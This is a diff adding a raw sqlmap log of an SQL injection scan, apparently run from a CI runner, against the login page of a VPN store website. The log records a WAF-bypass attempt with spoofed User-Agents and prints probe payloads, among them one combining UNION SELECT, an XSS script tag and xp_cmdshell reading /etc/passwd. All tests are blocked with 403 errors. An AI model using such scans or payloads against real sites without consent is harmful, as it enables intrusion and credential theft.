@@ -1,0 +1,80 @@
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.10#pip}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:17:30 /2026-10-24/
+
+[08:17:30] [INFO] parsing HTTP request from '/tmp/sqlmap_request.txt'
+[08:17:30] [DEBUG] cleaning up configuration parameters
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:17:30] [DEBUG] setting the HTTP timeout
+[08:17:30] [DEBUG] setting the HTTP User-Agent header
+[08:17:30] [DEBUG] loading random HTTP User-Agent header(s) from file '/home/runner/.local/lib/python3.12/site-packages/sqlmap/data/txt/user-agents.txt'
+[08:17:30] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Safari/605.1.15' from file '/home/runner/.local/lib/python3.12/site-packages/sqlmap/data/txt/user-agents.txt'
+[08:17:30] [DEBUG] creating HTTP requests opener object
+it appears that provided value for POST parameter 'email' has boundaries. Do you want to inject inside? ('@EMAIL*@') [y/N] N
+[08:17:30] [DEBUG] used the default behavior, running in batch mode
+POST parameter '_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[08:17:30] [DEBUG] used the default behavior, running in batch mode
+Cookie parameter 'XSRF-TOKEN' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[08:17:30] [DEBUG] used the default behavior, running in batch mode
+[08:17:30] [DEBUG] resolving hostname 'www.nadiavpn.web.id'
+[08:17:30] [INFO] testing connection to the target URL
+[08:17:31] [DEBUG] declared web page charset 'utf-8'
+got a 301 redirect to 'https://www.nadiavpn.web.id/login'. Do you want to follow? [Y/n] Y
+[08:17:31] [DEBUG] used the default behavior, running in batch mode
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[08:17:31] [DEBUG] used the default behavior, running in batch mode
+[08:17:31] [INFO] checking if the target is protected by some kind of WAF/IPS
+[08:17:31] [PAYLOAD] 3190 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+[08:17:32] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:32] [WARNING] reflective value(s) found and filtering out
+[08:17:32] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
+are you sure that you want to continue with further target testing? [Y/n] Y
+[08:17:32] [DEBUG] used the default behavior, running in batch mode
+do you want sqlmap to try to automatically bypass the WAF/IPS during the run (e.g. by using a non-scanner User-Agent and tamper script(s))? [Y/n] Y
+[08:17:32] [DEBUG] used the default behavior, running in batch mode
+[08:17:32] [INFO] using a random (non-scanner) User-Agent and browser-like headers to bypass the WAF/IPS
+[08:17:32] [INFO] testing if the target URL content is stable
+[08:17:33] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:33] [INFO] ignoring POST parameter '_token'
+[08:17:33] [WARNING] POST parameter 'email' does not appear to be dynamic
+[08:17:33] [PAYLOAD] @EMAIL@,),(())".'
+[08:17:34] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:34] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be SQL injectable
+[08:17:34] [PAYLOAD] @EMAIL@'gMwZKK<'">)AprzgX
+[08:17:35] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:35] [INFO] skipping POST parameter 'email'
+[08:17:35] [WARNING] POST parameter 'password' does not appear to be dynamic
+[08:17:35] [PAYLOAD] test123"'.,(,)(((
+[08:17:36] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:36] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be SQL injectable
+[08:17:36] [PAYLOAD] test123'eUroIY<'">)ClOtLS
+[08:17:38] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:38] [INFO] skipping POST parameter 'password'
+[08:17:38] [INFO] ignoring Cookie parameter 'XSRF-TOKEN'
+[08:17:38] [WARNING] Cookie parameter 'nadia-vpn-store-session' does not appear to be dynamic
+[08:17:38] [PAYLOAD] eyJpdiI6IjhUYTIrSG9wMyt6RFNvYVNHSTh3YlE9PSIsInZhbHVlIjoiTFN5RVNJcjUrM1paemZIM0ZmaTlrVU5kVklUcXpvbnlqcnY1dVVKZTRNZ2NXRVlvcUlsWmp2KzJ6c3djNk1RNjFrY0JpcVFBYTFUcWkxYXMwN2N4QUEvUXJLelQwYTlpMlRVV0xJRm5QR01hRlJRQjQvUGpkNjhxWHBRZXdRaXgiLCJtYWMiOiIzZTYyODc0ZjcyZjBlYjMxZTA1ZmJmM2JjNjRmYzEwMTdmZmRmZGU5MWFhYmZlNWZlZGEzODJiYmFjNTAwM2MyIiwidGFnIjoiIn0%3D',)".,,(.,
+do you want to URL encode cookie values (implementation specific)? [Y/n] Y
+[08:17:38] [DEBUG] used the default behavior, running in batch mode
+[08:17:39] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:39] [WARNING] heuristic (basic) test shows that Cookie parameter 'nadia-vpn-store-session' might not be SQL injectable
+[08:17:39] [PAYLOAD] eyJpdiI6IjhUYTIrSG9wMyt6RFNvYVNHSTh3YlE9PSIsInZhbHVlIjoiTFN5RVNJcjUrM1paemZIM0ZmaTlrVU5kVklUcXpvbnlqcnY1dVVKZTRNZ2NXRVlvcUlsWmp2KzJ6c3djNk1RNjFrY0JpcVFBYTFUcWkxYXMwN2N4QUEvUXJLelQwYTlpMlRVV0xJRm5QR01hRlJRQjQvUGpkNjhxWHBRZXdRaXgiLCJtYWMiOiIzZTYyODc0ZjcyZjBlYjMxZTA1ZmJmM2JjNjRmYzEwMTdmZmRmZGU5MWFhYmZlNWZlZGEzODJiYmFjNTAwM2MyIiwidGFnIjoiIn0%3D'CEFoDJ<'">)LGxTNq
+[08:17:40] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:40] [INFO] skipping Cookie parameter 'nadia-vpn-store-session'
+[08:17:40] [WARNING] parameter 'Referer' does not appear to be dynamic
+[08:17:40] [PAYLOAD] https://www.nadiavpn.web.id/login,('((.)",(
+[08:17:41] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:41] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be SQL injectable
+[08:17:41] [PAYLOAD] https://www.nadiavpn.web.id/login'kTcvJd<'">)cZNBzf
+[08:17:42] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:42] [INFO] skipping parameter 'Referer'
+[08:17:42] [WARNING] parameter 'User-Agent' does not appear to be dynamic
+[08:17:43] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:43] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be SQL injectable
+[08:17:44] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:44] [INFO] skipping parameter 'User-Agent'
